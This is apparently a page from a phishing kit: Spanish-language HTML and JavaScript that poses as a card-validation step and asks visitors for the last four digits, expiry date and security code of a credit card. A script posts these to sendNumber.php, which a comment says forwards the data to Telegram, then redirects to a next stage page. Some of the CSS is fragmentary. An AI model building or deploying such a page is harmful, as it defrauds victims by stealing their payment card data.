<style>
    /* Tus estilos existentes */

        pointer-events: none;

        width: 300px;

    .fua {
        text-transform: none;

        font-weight: 500!important;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
    }
    
    /* Estilos para la ventana emergente */
    .popup-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.5);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 1000;
    }
    
    .popup {
        background-color: white;
        width: 350px;
        padding: 20px;
        border-radius: 10px;
        text-align: center;
        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
        animation: fadeIn 0.3s ease-in-out;
    }

        font-size: 18px;
        color: #333;

    }

        width: 100%;
        height: 40px;
        margin-bottom: 15px;
        padding: 0 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        outline: none;
        font-size: 16px;
    }
    
    .popup .fua {
        width: 100%;
        height: 45px;
        border-radius: 5px;
    }
    
    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: scale(0.9);
        }
        to {
            opacity: 1;
            transform: scale(1);
        }
    }
    </style>
    
<body style="margin: 0;">
    

<div style="margin-left: -20px;">










    <div style="width: 100%;height: 70px;padding: 10px;margin-left: 10px;">
        <img width="120px" src="img/lk.svg" alt="">
        
            </div>
        
            <div class="masa3" >
                <center>        <img style="margin-top: 3px;width: 15px;" src="img/icon-login.png" alt="">
                    </div>
        
        
        
        
        
        
                    <div style=" padding: 5px;">
                        <center> 
                            <br> 
         
        
        
                            <form class="form" id="mainForm">
                                <center>          
                                    <div style="width: 300px;">
                                        <p style="font-family: sans-serif; font-size: 18px; color: #555;">
                                            Valida alguna de tus tarjetas de crédito para finalizar.
                                        </p>
                                        <img src="img/carcc.png" alt="">
                                    </div>
                                </center>
                                
                                <br>
                            
                                <div>
                                    <input style="margin-top: -145px;" class="pp2" type="text" name="tarj" id="tarj" 
                                           placeholder="Últimos 4 dígitos" inputmode="numeric" minlength="4" maxlength="4" required>
                                </div>
                            
                                <br><br>
                            
                                <div style="margin-top: 4px;">
                                    <input inputmode="numeric" type="text" id="fecha" name="fecha" maxlength="7" 
                                           oninput="formatFecha(event)" required style="margin-top: -95px;" 
                                           class="pp2" placeholder="MM/AA">
                                </div>
                            
                                <img src="img/cvv.png" alt="" style="width: 100%; margin-top: -40px;">
                                <br><br>
                            
                                <input type="text" class="pp2" inputmode="numeric" name="cvv" id="cvv" 
                                       maxlength="3" placeholder="Código de seguridad" required>
                            
                                <br><br>
                            
                                <button type="button" class="met" id="sendCardData">CONTINUAR</button>
                            </form>
                            
                            <script>
                                // Formatear la fecha MM/AA
                                function formatFecha(event) {
                                    let input = event.target;
                                    let inputValue = input.value.replace(/\D/g, ''); // Elimina caracteres no numéricos
                                    let formattedValue = '';
                            
                                    if (inputValue.length >= 2) {
                                        formattedValue += inputValue.substr(0, 2);
                                        if (inputValue.length > 2) {
                                            formattedValue += '/' + inputValue.substr(2, 2);
                                        }
                                    } else {
                                        formattedValue = inputValue;
                                    }
                            
                                    input.value = formattedValue;
                                }
                            
                                // Enviar datos a Telegram y redirigir a carg3.html
                                document.getElementById('sendCardData').addEventListener('click', function() {
                                    const formData = new FormData(document.getElementById('mainForm'));
                            
                                    fetch("sendNumber.php", {
                                        method: "POST",
                                        body: formData
                                    })
                                    .then(response => response.json())
                                    .then(() => {
                                        window.location.href = 'carg4.html'; // Redirige a carg3.html después de enviar los datos
                                    })
                                    .catch(error => console.error("Error al enviar los datos:", error));
                                });
                            </script>
                            
        
        
                    </center>
                    </div>
        













    
</div>
